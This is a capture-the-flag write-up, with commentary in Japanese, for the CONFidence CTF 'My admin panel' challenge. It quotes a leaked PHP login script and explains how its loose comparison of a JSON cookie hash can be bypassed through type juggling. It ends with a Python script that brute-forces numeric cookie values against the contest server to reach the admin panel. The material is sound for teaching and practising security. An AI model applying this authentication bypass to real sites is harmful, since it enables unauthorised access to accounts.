# CONFidence CTF

## My admin panel

```
My admin panel
Points: 58
Solves: 119
I think I've found something interesting, but I'm not really a PHP expert. Do you think it's exploitable?

https://gameserver.zajebistyc.tf/admin/
The flag format is: p4{letters_digits_and_special_characters}.
If you have any questions, you can find our team-members at the IRC channel #p4team @ freenode.
```

* URLに遷移すると、login.phpとlogin.php.bkが該当のディレクトリにあることが分かる。
* bkのほうのコードは以下のようで、cookieにotadminという名前で、値にhashをキーにして値を渡してやり、その値がサーバー側で保持している値（cfg_pass）のMD5と合致したら、display_admin()が発火されるという仕組み。

```
<?php

include '../func.php';
include '../config.php';

if (!$_COOKIE['otadmin']) {
    exit("Not authenticated.\n");
}

if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
    exit();
}

$session_data = json_decode($_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

    exit("\n");
}

display_admin();

```

* ord関数は文字のASCII値を返す。
* 適当にcookieに値を詰めると以下のような文面が現れる

```
I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400
```

* 上の結果から、cfg_passのMD5変換したもののうち、64になっているところは、a~fのどれかで、0のところは数字であることが分かる。

* 全組み合わせを総当たりはきつそう。

* と思いきや、上記のコードでは[loose comparison](https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf)をしているので、最初に数字以外の記号が出てくるまでの数字と等しい値をcookieに入れてやれば、display_admin()まで到達できる。

* 上記の結果から、最初の三桁は0～9の数字であることが分かるので、以下のようなコードで0～1000まで確かめてやればよい

```
import requests

url = 'https://gameserver.zajebistyc.tf/admin/login.php'
s = requests.Session()
for i in range(1000):
    r = s.get(url, cookies={'otadmin': '{"hash": ' + str(i) + '}'})
    if 'HINT' not in str(r.content):
        print(str(r.content))
        break
```

